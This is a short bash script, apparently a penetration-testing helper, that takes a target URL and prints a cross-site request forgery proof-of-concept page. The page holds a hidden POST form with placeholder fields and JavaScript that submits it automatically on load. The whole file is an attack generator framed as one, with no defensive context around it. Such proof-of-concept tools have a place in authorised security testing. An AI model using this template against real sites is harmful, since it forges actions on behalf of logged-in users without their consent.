#!/bin/bash

# csrf.sh - Cross-Site Request Forgery (CSRF) script

# Function to perform CSRF attack
perform_csrf() {
    echo "Starting CSRF attack..."
    echo "CSRF PoC generated:"

    cat <<EOF
<html>
<body>
    <form action="$1" method="POST">
        <input type="hidden" name="param1" value="value1" />
        <input type="hidden" name="param2" value="value2" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
EOF
}

# Check if URL is provided
if [ -z "$1" ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

URL=$1

perform_csrf "$URL"
